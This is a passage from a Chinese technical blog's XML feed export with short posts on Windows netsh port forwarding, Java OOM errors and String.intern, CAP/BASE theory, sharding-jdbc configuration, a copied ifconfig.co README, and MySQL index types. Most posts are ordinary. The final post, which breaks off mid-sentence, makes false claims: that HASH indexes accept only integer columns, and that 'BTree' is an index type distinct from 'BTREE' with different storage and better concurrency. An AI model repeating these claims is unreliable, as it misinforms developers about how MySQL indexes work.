            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 netsh 实现 windows 上端口转发</title>
      <link href="/2018/04/11/%E4%BD%BF%E7%94%A8%20netsh%20%E5%AE%9E%E7%8E%B0%20windows%20%E4%B8%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2018/04/11/%E4%BD%BF%E7%94%A8%20netsh%20%E5%AE%9E%E7%8E%B0%20windows%20%E4%B8%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=**** connectaddress=192.168.1.101 connectport=1111</span><br><span class="line"></span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=80</span><br></pre></td></tr></table></figure><ul><li><a href="https://blog.csdn.net/caiqiiqi/article/details/52855690">https://blog.csdn.net/caiqiiqi/article/details/52855690</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java内存溢出(OOM)异常完全指南</title>
      <link href="/2018/02/28/Java%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA(OOM)%E5%BC%82%E5%B8%B8%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2018/02/28/Java%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA(OOM)%E5%BC%82%E5%B8%B8%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://www.jianshu.com/p/2fdee831ed03">Java内存溢出(OOM)异常完全指南</a></li></ul><p>java.lang.OutOfMemoryError:Java heap space</p><p>java.lang.OutOfMemoryError:GC overhead limit exceeded</p><p>java.lang.OutOfMemoryError:Permgen space</p><p>java.lang.OutOfMemoryError:Metaspace</p><p>java.lang.OutOfMemoryError:Unable to create new native thread</p><p>java.lang.OutOfMemoryError:Out of swap space?</p><p>java.lang.OutOfMemoryError:Requested array size exceeds VM limit</p><p>Out of memory:Kill process or sacrifice child</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>String类的intern方法</title>
      <link href="/2018/02/24/String%E7%B1%BB%E7%9A%84intern%E6%96%B9%E6%B3%95/"/>
      <url>/2018/02/24/String%E7%B1%BB%E7%9A%84intern%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>如果能答对下面的程序的输出，那就可以明白intern的原理了。</p><ul><li><a href="http://www.cnblogs.com/paddix/p/5326863.html">通过反编译深入理解Java String及intern</a></li><li><a href="http://blog.csdn.net/seu_calvin/article/details/52291082">了解String类的intern()方法</a></li></ul><span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;stringxxx&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;stringxxx&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> str2.intern();</span><br><span class="line"></span><br><span class="line">        System.out.println(str1 == str2);<span class="comment">//#1</span></span><br><span class="line">        System.out.println(str1 == str3);<span class="comment">//#2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">baseStr</span> <span class="operator">=</span> <span class="string">&quot;baseStr&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">baseFinalStr</span> <span class="operator">=</span> <span class="string">&quot;baseStr&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;baseStr01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;baseStr&quot;</span> + <span class="string">&quot;01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> baseStr + <span class="string">&quot;01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> baseFinalStr + <span class="string">&quot;01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;baseStr01&quot;</span>).intern();</span><br><span class="line"></span><br><span class="line">        System.out.println(str1 == str2);<span class="comment">//#3</span></span><br><span class="line">        System.out.println(str1 == str3);<span class="comment">//#4</span></span><br><span class="line">        System.out.println(str1 == str4);<span class="comment">//#5</span></span><br><span class="line">        System.out.println(str1 == str5);<span class="comment">//#6</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;str&quot;</span>) + <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;01&quot;</span>);</span><br><span class="line">        str2.intern();</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;str01&quot;</span>;</span><br><span class="line">        System.out.println(str2 == str1);<span class="comment">//#7</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;str01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;str&quot;</span>) + <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;01&quot;</span>);</span><br><span class="line">        str2.intern();</span><br><span class="line">        System.out.println(str2 == str1);<span class="comment">//#8</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL prepare 原理</title>
      <link href="/2018/02/11/MySQL%20prepare%20%E5%8E%9F%E7%90%86/"/>
      <url>/2018/02/11/MySQL%20prepare%20%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>之前对 prepare query 的理解还停留在SQL注入的层面，直到看到了下面的这篇文章。</p><p>prepare 的两个大的成果，一个是提升效率、一个是防SQL注入。</p><p>提升效率可以从SQL执行计划来分析。</p><ul><li><a href="http://www.cnblogs.com/justfortaste/p/3920140.html">MySQL prepare 原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>磨刀</title>
      <link href="/2018/02/02/%E7%A3%A8%E5%88%80/"/>
      <url>/2018/02/02/%E7%A3%A8%E5%88%80/</url>
      
        <content type="html"><![CDATA[<p>刀使用久了会钝，是需要磨的，在很久以前，觉得磨刀是一件没什么学问的事情。</p><p>拿着刀，在磨刀石上面蹭蹭蹭就可以了。后来才发现，其实不是那么简单的。</p><p>刀的核心东西还是材质，只有好的材质才能开出好的刃，和朽木不可雕也，是一个道理。</p><h1 id="磨刀石的目数"><a href="#磨刀石的目数" class="headerlink" title="磨刀石的目数"></a>磨刀石的目数</h1><p>简单说，就是指每平方厘米的磨石表面有多少颗粒。</p><p>五金市场常见的那种双面磨石，一般是200&#x2F;400目或者600&#x2F;800目之类的。</p><p>目数越高，从刀刃上剥落的金属越小越细，宏观上看就是刀刃越光滑。</p><p>低目数的磨石用来粗磨，高目数的修刃，再高点的抛光，不能混用。</p><p><img src="/assets/images/%E7%A3%A8%E5%88%80%E7%9F%B3.jpg"> </p><p>所以一般磨刀的话，先从低目数开始打磨，之后慢慢增加目数，比如说，可以先用300目、800目、1200目、2000目这样上去。</p><p>之前看到有一个磨刀视频，不知道在哪儿去了。</p>]]></content>
      
      
      <categories>
          
          <category> Daily Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 磨刀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式领域CAP理论</title>
      <link href="/2018/02/02/%E5%88%86%E5%B8%83%E5%BC%8F%E9%A2%86%E5%9F%9FCAP%E7%90%86%E8%AE%BA/"/>
      <url>/2018/02/02/%E5%88%86%E5%B8%83%E5%BC%8F%E9%A2%86%E5%9F%9FCAP%E7%90%86%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<p>分布式领域CAP理论 </p><ul><li>Consistency(一致性), 数据一致更新, 所有数据变动都是同步的</li><li>Availability(可用性), 好的响应性能</li><li>Partition tolerance(分区容忍性), 可靠性</li></ul><span id="more"></span><h1 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h1><blockquote><p>任何分布式系统只可同时满足二点，没法三者兼顾。</p></blockquote><p>不要将精力浪费在如何设计能满足三者的完美分布式系统，而是应该相应的取舍。</p><h1 id="ACID模型"><a href="#ACID模型" class="headerlink" title="ACID模型"></a>ACID模型</h1><p>关系数据库的ACID模型拥有高一致性 + 可用性 ，但是很难进行分区：</p><ul><li>Atomicity 原子性：一个事务中所有操作都必须全部完成，要么全部不完成。</li><li>Consistency 一致性： 在事务开始或结束时，数据库应该在一致状态。</li><li>Isolation 隔离性：事务将假定只有它自己在操作数据库，彼此不知晓。</li><li>Durability：耐久性，一旦事务完成，就不能返回。</li></ul><p>跨数据库两段提交事务：2PC (two-phase commit)， 2PC is the anti-scalability pattern (Pat Helland) 是 <code>反可伸缩模式</code> 的，JavaEE中的JTA事务可以支持2PC。因为2PC是反模式，尽量不要使用2PC，使用 <code>BASE</code> 来回避。</p><h1 id="BASE模型"><a href="#BASE模型" class="headerlink" title="BASE模型"></a>BASE模型</h1><p>BASE模型反ACID模型，完全不同ACID模型，牺牲高一致性，获得可用性或可靠性：</p><ul><li>Basically Available 基本可用, 支持分区失败(e.g. sharding碎片划分数据库)</li><li>Soft state 软状态, 状态可以有一段时间不同步，异步。</li><li>Eventually consistent 最终一致, 最终数据是一致的就可以了, 而不是时时高一致。</li></ul><p>BASE思想的主要实现有</p><ul><li>按功能划分数据库</li><li>Sharding 分片</li></ul><p>BASE思想主要强调基本的可用性，如果你需要很高的可用性，也就是纯粹的高性能，那么就要以一致性或容忍性为牺牲，BASE思想的方案在性能上还是有潜力可挖的。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sharding-jdbc</title>
      <link href="/2018/02/01/sharding-jdbc/"/>
      <url>/2018/02/01/sharding-jdbc/</url>
      
        <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><ul><li><a href="https://github.com/shardingjdbc/sharding-jdbc">https://github.com/shardingjdbc/sharding-jdbc</a></li><li><a href="http://shardingjdbc.io/docs/00-overview">官方文档</a></li><li><a href="https://www.cnblogs.com/zwt1990/p/6762135.html">sharding-jdbc结合mybatis实现分库分表功能</a></li><li><a href="https://www.cnblogs.com/yjmyzz/p/sharding-jdbc-turotial.html">利用sharding-jdbc分库分表</a></li><li>官方的example，提供了注解、Spring namespace、MyBatis、代码等配置情况。</li></ul><p>sharding-jdbc 是一个优秀的分库分表的工具类。同样的分库分表的数据库中间件有mycat。</p><p>sharding-jdbc 接管连接池、分析SQL来达到在程序内的sharding功能；而mycat 更像是一个中间件产品，对程序来讲，是认为mycat就是mysql。</p><span id="more"></span><h2 id="特别需要注意的地方有几个："><a href="#特别需要注意的地方有几个：" class="headerlink" title="特别需要注意的地方有几个："></a>特别需要注意的地方有几个：</h2><p>配置文件配置的时候，inline的 placeholder 会和 Spring 的placeholder冲突，需要配置 Spring 忽略不可解析 ignore-unresolvable </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:app.properties&quot;</span> <span class="attr">ignore-unresolvable</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>inline 解析表规则的时候，官方的example中只有最简单的求余，下面我需要的是按日期年月来分表的逻辑。注意，当真是表不存在的事情，在具体sharding的时候会提示表xxx 不存在的错误。需要注意下时间的操作逻辑。解析inline表名可以参考源码。如果不放心，可以写一个测试用例。 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sharding:data-source</span> <span class="attr">id</span>=<span class="string">&quot;shardingDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sharding:sharding-rule</span> <span class="attr">data-source-names</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sharding:table-rules</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sharding:table-rule</span> <span class="attr">logic-table</span>=<span class="string">&quot;fuel_daily&quot;</span></span></span><br><span class="line"><span class="tag">                                 <span class="attr">actual-data-nodes</span>=<span class="string">&quot;dataSource.fuel_daily_$&#123;2017..2030&#125;$&#123;[&#x27;01&#x27;,&#x27;02&#x27;,&#x27;03&#x27;,&#x27;04&#x27;,&#x27;05&#x27;,&#x27;06&#x27;,&#x27;07&#x27;,&#x27;08&#x27;,&#x27;09&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;]&#125;&quot;</span></span></span><br><span class="line"><span class="tag">&lt;!<span class="attr">--</span> <span class="attr">这里会笛卡尔积解析成所有的真实表</span>。 <span class="attr">--</span>&gt;</span>                                 </span><br><span class="line">                                 table-strategy-ref=&quot;stattimeShardingStrategy&quot;/&gt;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">sharding:table-rules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sharding:binding-table-rules</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sharding:binding-table-rule</span> <span class="attr">logic-tables</span>=<span class="string">&quot;fuel_daily&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sharding:binding-table-rules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">sharding:sharding-rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sharding:data-source</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在某些函数支持的不是很好，比如说在sharding的时候做sum，我遇到了返回多个返回值的情况，我想到的解决方法是手动去sum，不用在SQL中做。</p><p>在引包的时候，注意如果Spring 的namespace无法找打，清合适下是否Spring的namespace包被引入了。我找了源码最后才确定了包名。</p><p>insert into values (“”, “”) 多个时候，会导致不能正确的选择分片执行。所以最好的方式是手动维护Map来决定怎么批量insert。</p><p>最后，如果实在不放心的时候，清注意写好测试用例来验证。</p><p>希望sharing-jdbc 越来越好。</p><p><img src="/assets/images/sharding-jdbc.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloud not resolve placeholder … in string value</title>
      <link href="/2018/01/28/Cloud%20not%20resolve%20placeholder%20%E2%80%A6%20in%20string%20value%20/"/>
      <url>/2018/01/28/Cloud%20not%20resolve%20placeholder%20%E2%80%A6%20in%20string%20value%20/</url>
      
        <content type="html"><![CDATA[<p>sharding jdbc中的inline表达式，Spring Property 冲突。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;context:property-placeholder location=<span class="string">&quot;classpath:property/*.properties&quot;</span> ignore-unresolvable=<span class="string">&quot;true&quot;</span> /&gt;  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ifconfig</title>
      <link href="/2018/01/22/ifconfig/"/>
      <url>/2018/01/22/ifconfig/</url>
      
        <content type="html"><![CDATA[<p>A simple service for looking up your IP address. This is the code that powers<br><a href="https://ifconfig.co/">https://ifconfig.co</a>.</p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>Just the business, please:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ curl ifconfig.co</span><br><span class="line">127.0.0.1</span><br><span class="line"></span><br><span class="line">$ http ifconfig.co</span><br><span class="line">127.0.0.1</span><br><span class="line"></span><br><span class="line">$ wget -qO- ifconfig.co</span><br><span class="line">127.0.0.1</span><br><span class="line"></span><br><span class="line">$ fetch -qo- https://ifconfig.co</span><br><span class="line">127.0.0.1</span><br><span class="line"></span><br><span class="line">$ bat -print=b ifconfig.co/ip</span><br><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure><p>Country and city lookup:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ curl ifconfig.co/country</span><br><span class="line">Elbonia</span><br><span class="line"></span><br><span class="line">$ curl ifconfig.co/country-iso</span><br><span class="line">EB</span><br><span class="line"></span><br><span class="line">$ curl ifconfig.co/city</span><br><span class="line">Bornyasherk</span><br><span class="line"></span><br><span class="line">$ curl ifconfig.co/asn</span><br><span class="line">AS59795</span><br></pre></td></tr></table></figure><p>As JSON:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H &#x27;Accept: application/json&#x27; ifconfig.co  # or curl ifconfig.co/json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;city&quot;: &quot;Bornyasherk&quot;,</span><br><span class="line">  &quot;country&quot;: &quot;Elbonia&quot;,</span><br><span class="line">  &quot;country_iso&quot;: &quot;EB&quot;,</span><br><span class="line">  &quot;ip&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">  &quot;ip_decimal&quot;: 2130706433,</span><br><span class="line">  &quot;asn&quot;: &quot;AS59795&quot;,</span><br><span class="line">  &quot;asn_org&quot;: &quot;Hosting4Real&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Port testing:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl ifconfig.co/port/80</span><br><span class="line">&#123;</span><br><span class="line">  &quot;ip&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">  &quot;port&quot;: 80,</span><br><span class="line">  &quot;reachable&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Pass the appropriate flag (usually <code>-4</code> and <code>-6</code>) to your client to switch<br>between IPv4 and IPv6 lookup.</p><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>Easy to remember domain name</li><li>Fast</li><li>Supports IPv6</li><li>Supports HTTPS</li><li>Supports common command-line clients (e.g. <code>curl</code>, <code>httpie</code>, <code>ht</code>, <code>wget</code> and <code>fetch</code>)</li><li>JSON output</li><li>ASN, country and city lookup using the MaxMind GeoIP database</li><li>Port testing</li><li>All endpoints (except <code>/port</code>) can return information about a custom IP address specified via <code>?ip=</code> query parameter</li><li>Open source under the <a href="https://opensource.org/licenses/BSD-3-Clause">BSD 3-Clause license</a></li></ul><h2 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h2><ul><li>To scratch an itch</li><li>An excuse to use Go for something</li><li>Faster than ifconfig.me and has IPv6 support</li></ul><h2 id="Building"><a href="#Building" class="headerlink" title="Building"></a>Building</h2><p>Compiling requires the <a href="https://golang.org/">Golang compiler</a> to be installed.<br>This package can be installed with:</p><p><code>go install github.com/mpolden/echoip/...@latest</code></p><p>For more information on building a Go project, see the <a href="https://golang.org/doc/code.html">official Go<br>documentation</a>.</p><h2 id="Docker-image"><a href="#Docker-image" class="headerlink" title="Docker image"></a>Docker image</h2><p>A Docker image is available on <a href="https://hub.docker.com/r/mpolden/echoip">Docker<br>Hub</a>, which can be downloaded with:</p><p><code>docker pull mpolden/echoip</code></p><h3 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ echoip -h</span><br><span class="line">Usage of echoip:</span><br><span class="line">  -C int</span><br><span class="line">    Size of response cache. Set to 0 to disable</span><br><span class="line">  -H value</span><br><span class="line">    Header to trust for remote IP, if present (e.g. X-Real-IP)</span><br><span class="line">  -a string</span><br><span class="line">    Path to GeoIP ASN database</span><br><span class="line">  -c string</span><br><span class="line">    Path to GeoIP city database</span><br><span class="line">  -f string</span><br><span class="line">    Path to GeoIP country database</span><br><span class="line">  -l string</span><br><span class="line">    Listening address (default &quot;:8080&quot;)</span><br><span class="line">  -pEnable port lookup</span><br><span class="line">  -rPerform reverse hostname lookups</span><br><span class="line">  -t string</span><br><span class="line">    Path to template directory (default &quot;html&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ifconfig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用“逐步排除”的方法定位Java服务线上“系统性”故障</title>
      <link href="/2018/01/15/%E7%94%A8%E2%80%9C%E9%80%90%E6%AD%A5%E6%8E%92%E9%99%A4%E2%80%9D%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9A%E4%BD%8DJava%E6%9C%8D%E5%8A%A1%E7%BA%BF%E4%B8%8A%E2%80%9C%E7%B3%BB%E7%BB%9F%E6%80%A7%E2%80%9D%E6%95%85%E9%9A%9C/"/>
      <url>/2018/01/15/%E7%94%A8%E2%80%9C%E9%80%90%E6%AD%A5%E6%8E%92%E9%99%A4%E2%80%9D%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9A%E4%BD%8DJava%E6%9C%8D%E5%8A%A1%E7%BA%BF%E4%B8%8A%E2%80%9C%E7%B3%BB%E7%BB%9F%E6%80%A7%E2%80%9D%E6%95%85%E9%9A%9C/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://techblog.youdao.com/?p=961">用“逐步排除”的方法定位Java服务线上“系统性”故障</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL几种索引类型</title>
      <link href="/2018/01/12/MySQL%E5%87%A0%E7%A7%8D%E7%B4%A2%E5%BC%95%E7%B1%BB%E5%9E%8B/"/>
      <url>/2018/01/12/MySQL%E5%87%A0%E7%A7%8D%E7%B4%A2%E5%BC%95%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>索引是一种数据结构，用于加速数据库中的数据查询操作。不同的索引类型适用于不同的查询场景，选择合适的索引类型可以提高查询效率。</p><h3 id="1-FULLTEXT-索引"><a href="#1-FULLTEXT-索引" class="headerlink" title="1. FULLTEXT 索引"></a>1. FULLTEXT 索引</h3><p>FULLTEXT 索引是用于全文搜索的一种索引类型，它只能用于 MyISAM 和 InnoDB 表。FULLTEXT 索引可以帮助提高匹配关键字的查询速度，例如在文章标题或内容中搜索某个关键字。使用 FULLTEXT 索引时，需要注意以下几点：</p><ul><li>只有 CHAR、VARCHAR 和 TEXT 数据类型的列才能使用 FULLTEXT 索引。</li><li>默认情况下，MySQL 忽略长度小于 4 的单词，可以通过修改配置文件的 ft_min_word_len 参数来调整。</li><li>FULLTEXT 索引不支持排序操作，也不支持部分匹配查询。</li></ul><h3 id="2-HASH-索引"><a href="#2-HASH-索引" class="headerlink" title="2. HASH 索引"></a>2. HASH 索引</h3><p>HASH 索引使用哈希算法来快速查找索引值，适用于等值查询，但不支持范围查询和排序操作。HASH 索引只能用于 MEMORY 存储引擎，因为 MEMORY 存储引擎的表是基于哈希表实现的。使用 HASH 索引时，需要注意以下几点：</p><ul><li>只有整数类型的列才能使用 HASH 索引。</li><li>哈希冲突可能会导致查询性能下降，因此需要合理设置哈希桶的大小。</li></ul><h3 id="3-BTREE-索引"><a href="#3-BTREE-索引" class="headerlink" title="3. BTREE 索引"></a>3. BTREE 索引</h3><p>BTREE 索引使用 B-Tree 算法来存储索引值，适用于各种类型的查询，包括等值查询、范围查询和排序操作。BTREE 索引可以用于大多数存储引擎。使用 BTREE 索引时，需要注意以下几点：</p><ul><li>可以对任何数据类型的列使用 BTREE 索引。</li><li>索引的深度会影响查询性能，因此需要合理设置索引列的顺序和长度。</li><li>索引列的顺序对查询性能有影响，应该将最常用的列放在前面。</li></ul><h3 id="4-RTREE-索引"><a href="#4-RTREE-索引" class="headerlink" title="4. RTREE 索引"></a>4. RTREE 索引</h3><p>RTREE 索引用于存储空间数据，支持空间范围查询和空间关系查询。RTREE 索引只能用于 MyISAM 和 InnoDB 存储引擎。使用 RTREE 索引时，需要注意以下几点：</p><ul><li>只有 GEOMETRY 和 POINT 数据类型的列才能使用 RTREE 索引。</li><li>索引的深度会影响查询性能，因此需要合理设置索引列的顺序和长度。</li><li>索引列的顺序对查询性能有影响，应该将最常用的列放在前面。</li></ul><h3 id="5-BTree-索引"><a href="#5-BTree-索引" class="headerlink" title="5. BTree 索引"></a>5. BTree 索引</h3><p>BTree 索引与 BTREE 索引相同，只是存储方式不同。BTree 索引是一种基于 B-Tree 算法的索引类型，它可以用于大多数存储引擎。与 BTREE 索引相比，BTree 索引可以支持更高的并发访问，因为它使用了更加高效的锁机制。</p><h3 id="6-B-Tree-索引"><a href="#6-B-Tree-索引" class="headerlink" title="6. B+Tree 索引"></a>6. B+Tree 索引</h3><p>B+Tree 索引与 